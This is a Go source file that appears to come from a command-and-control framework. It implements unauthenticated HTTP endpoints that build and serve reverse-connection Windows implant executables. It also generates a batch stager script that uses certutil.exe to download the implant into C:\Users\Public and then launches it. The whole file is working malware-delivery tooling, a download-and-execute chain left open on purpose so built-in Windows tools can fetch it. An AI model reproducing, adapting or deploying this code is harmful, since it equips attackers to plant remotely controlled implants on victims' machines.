package api

import (
	"database/sql"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/gin-gonic/gin"
)

// StagerHandler serves stager scripts and payload binaries.
// These endpoints are intentionally unauthenticated so that
// certutil.exe (which cannot send Bearer tokens) can download them.
type StagerHandler struct {
	DB        *sql.DB
	Builder   *ImplantBuilder
	OutputDir string // e.g. ./payloads/stager
}

// NewStagerHandler creates a new StagerHandler.
func NewStagerHandler(db *sql.DB, builder *ImplantBuilder, outputDir string) *StagerHandler {
	return &StagerHandler{
		DB:        db,
		Builder:   builder,
		OutputDir: outputDir,
	}
}

// ServeStager handles GET /s/:listener_id/stager.bat
func (h *StagerHandler) ServeStager(c *gin.Context) {
	listenerID := c.Param("listener_id")
	if listenerID == "" {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": gin.H{"code": "BAD_REQUEST", "message": "listener_id is required"},
		})
		return
	}

	// Look up listener
	_, _, err := h.lookupListener(listenerID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{
			"error": gin.H{"code": "NOT_FOUND", "message": "listener not found"},
		})
		return
	}

	// Build server URL from the request
	scheme := "https"
	if c.Request.TLS == nil {
		scheme = "http"
	}
	serverURL := fmt.Sprintf("%s://%s", scheme, c.Request.Host)

	// Generate the batch stager script
	script := h.buildStagerScript(serverURL, listenerID)

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.Header("Content-Disposition", "attachment; filename=stager.bat")
	c.String(http.StatusOK, script)
}

// ServePayload handles GET /s/:listener_id/:arch (w64 or w32)
// Builds the implant on-demand if not already cached.
func (h *StagerHandler) ServePayload(c *gin.Context) {
	listenerID := c.Param("listener_id")
	arch := c.Param("arch")

	// Map arch shorthand to os/arch
	var goOS, goArch string
	switch arch {
	case "w64":
		goOS = "windows"
		goArch = "amd64"
	case "w32":
		goOS = "windows"
		goArch = "386"
	default:
		c.JSON(http.StatusBadRequest, gin.H{
			"error": gin.H{"code": "BAD_REQUEST", "message": "unsupported arch, use w64 or w32"},
		})
		return
	}

	// Verify listener exists
	_, _, err := h.lookupListener(listenerID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{
			"error": gin.H{"code": "NOT_FOUND", "message": "listener not found"},
		})
		return
	}

	// Check cache
	cacheDir := filepath.Join(h.OutputDir, listenerID)
	cacheFile := filepath.Join(cacheDir, fmt.Sprintf("implant-%s.exe", arch))

	if _, err := os.Stat(cacheFile); os.IsNotExist(err) {
		// Build implant
		if err := h.buildAndCache(listenerID, goOS, goArch, cacheDir, cacheFile); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{
				"error": gin.H{"code": "BUILD_FAILED", "message": err.Error()},
			})
			return
		}
	}

	c.File(cacheFile)
}

func (h *StagerHandler) lookupListener(listenerID string) (string, int, error) {
	var host string
	var port int
	err := h.DB.QueryRow(
		"SELECT host, port FROM listeners WHERE id = ?",
		listenerID,
	).Scan(&host, &port)
	if err != nil {
		return "", 0, fmt.Errorf("listener not found: %s", listenerID)
	}
	return host, port, nil
}

func (h *StagerHandler) buildAndCache(listenerID, goOS, goArch, cacheDir, cacheFile string) error {
	if err := os.MkdirAll(cacheDir, 0755); err != nil {
		return fmt.Errorf("creating cache dir: %w", err)
	}

	req := &BuildRequest{
		OS:             goOS,
		Arch:           goArch,
		ListenerID:     listenerID,
		ConnectionType: "reverse",
	}

	result, err := h.Builder.Build(req)
	if err != nil {
		return fmt.Errorf("build failed: %w", err)
	}

	// Move the built file to the cache location
	if err := os.Rename(result.FilePath, cacheFile); err != nil {
		// If rename fails (e.g. cross-device), try copy
		data, readErr := os.ReadFile(result.FilePath)
		if readErr != nil {
			return fmt.Errorf("reading built implant: %w", readErr)
		}
		if writeErr := os.WriteFile(cacheFile, data, 0755); writeErr != nil {
			return fmt.Errorf("caching implant: %w", writeErr)
		}
		os.Remove(result.FilePath) // clean up original
	}

	return nil
}

// buildStagerScript generates the batch stager script with the server URL embedded.
func (h *StagerHandler) buildStagerScript(serverURL, listenerID string) string {
	serverURL = strings.TrimRight(serverURL, "/")

	return fmt.Sprintf(`@echo off
setlocal enabledelayedexpansion

set u64="%s/s/%s/w64"
set u32="%s/s/%s/w32"
set v="C:\Users\Public\f528764dtcp.exe"
del %%v%% 2>nul

for /f "tokens=*" %%%%A in ('wmic os get osarchitecture ^| findstr 64') do (
    set "ARCH=64"
)
if "%%ARCH%%"=="64" (
    certutil.exe -urlcache -split -f %%u64%% %%v%%
) else (
    certutil.exe -urlcache -split -f %%u32%% %%v%%
)

start "" %%v%%
exit /b 0
`, serverURL, listenerID, serverURL, listenerID)
}
